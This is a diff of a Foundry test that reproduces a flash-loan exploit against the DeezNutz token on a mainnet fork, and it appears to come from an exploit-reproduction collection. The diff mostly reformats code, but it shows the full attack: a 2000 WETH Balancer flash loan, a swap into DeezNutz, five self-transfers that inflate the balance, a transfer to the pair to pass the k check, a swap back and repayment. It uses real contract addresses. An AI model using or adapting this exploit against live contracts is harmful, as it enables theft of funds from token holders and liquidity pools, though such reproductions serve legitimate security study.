@@ -12,10 +12,7 @@ import "./../interface.sol";
 // @Analysis
 // https://twitter.com/ImmuneBytes/status/1664239580210495489
 
-
-
 contract DeezNutzTest is Test {
-    
     IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 DeezNutz = IERC20(0xb57E874082417b66877429481473CF9FCd8e0b8a); // 404 token can be regarded as erc20
@@ -23,54 +20,47 @@ contract DeezNutzTest is Test {
     address pair = 0x1fB4904b26DE8C043959201A63b4b23C414251E2; // pair address
 
     function setUp() public {
-        vm.createSelectFork("mainnet",19277802);
+        vm.createSelectFork("mainnet", 19_277_802);
         emit log_named_uint("Before attack, WETH amount", WETH.balanceOf(address(this)) / 1 ether);
     }
 
     function testExploit() public {
         address[] memory tokens = new address[](1);
         tokens[0] = address(WETH);
-        uint[] memory amounts = new uint[](1);
-        amounts[0] =2000 ether;        
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = 2000 ether;
 
         emit log_string("------------------- flashloan from balancer ---------");
-        vault.flashLoan(address(this),tokens, amounts, "");
+        vault.flashLoan(address(this), tokens, amounts, "");
         emit log_string("------------------- flashloan finish ----------------");
-        
-        emit log_named_uint("after attack, WETH amount", WETH.balanceOf(address(this)) / 1 ether);
 
+        emit log_named_uint("after attack, WETH amount", WETH.balanceOf(address(this)) / 1 ether);
     }
 
-    function receiveFlashLoan(
-        address[] memory,
-        uint256[] memory,
-        uint256[] memory,
-        bytes memory
-    ) external {
+    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
         emit log_named_uint("after borrow, WETH amount", WETH.balanceOf(address(this)) / 1 ether);
 
-        WETH.approve(address(router),type(uint).max);
+        WETH.approve(address(router), type(uint256).max);
         address[] memory path = new address[](2);
         path[0] = address(WETH);
         path[1] = address(DeezNutz);
 
-        router.swapExactTokensForTokens(WETH.balanceOf(address(this)),0,path,address(this),type(uint).max);
+        router.swapExactTokensForTokens(WETH.balanceOf(address(this)), 0, path, address(this), type(uint256).max);
         emit log_named_uint("after swap, DeezNutz amount", DeezNutz.balanceOf(address(this)) / 1 ether);
 
-        for (uint x = 0; x < 5; x++) {
-            DeezNutz.transfer(address(this),DeezNutz.balanceOf(address(this)));
+        for (uint256 x = 0; x < 5; x++) {
+            DeezNutz.transfer(address(this), DeezNutz.balanceOf(address(this)));
             emit log_named_uint("after self transfer, DeezNutz amount", DeezNutz.balanceOf(address(this)) / 1 ether);
         }
 
-        DeezNutz.approve(address(router),type(uint).max);
+        DeezNutz.approve(address(router), type(uint256).max);
         path[0] = address(DeezNutz);
         path[1] = address(WETH);
 
-        DeezNutz.transfer(pair,DeezNutz.balanceOf(address(this))/20); // to pass k value test.
-        router.swapExactTokensForTokens(DeezNutz.balanceOf(address(this)),0,path,address(this),type(uint).max);
+        DeezNutz.transfer(pair, DeezNutz.balanceOf(address(this)) / 20); // to pass k value test.
+        router.swapExactTokensForTokens(DeezNutz.balanceOf(address(this)), 0, path, address(this), type(uint256).max);
         emit log_named_uint("after swap back, WETH amount", WETH.balanceOf(address(this)) / 1 ether);
 
-        WETH.transfer(msg.sender,2001 ether);
+        WETH.transfer(msg.sender, 2001 ether);
     }
-
 }
